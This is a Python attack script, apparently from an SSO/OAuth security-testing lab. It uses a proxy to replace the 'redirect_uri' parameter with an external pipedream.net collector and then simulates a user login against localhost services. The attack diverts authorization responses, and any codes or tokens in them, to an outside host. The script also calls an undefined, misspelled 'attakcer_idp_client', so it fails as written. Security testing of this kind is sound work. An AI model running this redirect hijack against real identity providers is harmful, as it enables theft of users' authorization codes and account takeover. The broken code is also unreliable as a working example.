import sys
import os
import time

sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

from browser import BrowserSimulator
from proxy import ProxyClient
import id_token

proxy_client = ProxyClient("localhost", 5555)
simulator = BrowserSimulator('http://localhost:5000/login', 'http://localhost:8080')

try:
    # replace redirect_uri
    redirect_uri = 'https://eo2zoljihgn2f5z.m.pipedream.net'
    proxy_client.modify_query_param('redirect_uri', redirect_uri)    

    # browser simulation
    sso_flow = """page.locator('input[name="login"]').fill('hoge')
page.locator('input[name="password"]').fill('huga')
page.locator('button[type="submit"]').click()
page.locator('button[type="submit"]').click()
print(page.content())
    """
    
    simulator.run(sso_flow)
    simulator.close()

    attakcer_idp_client.delete_task()
except Exception as e:
    print('Error:', e)
    attakcer_idp_client.delete_task()
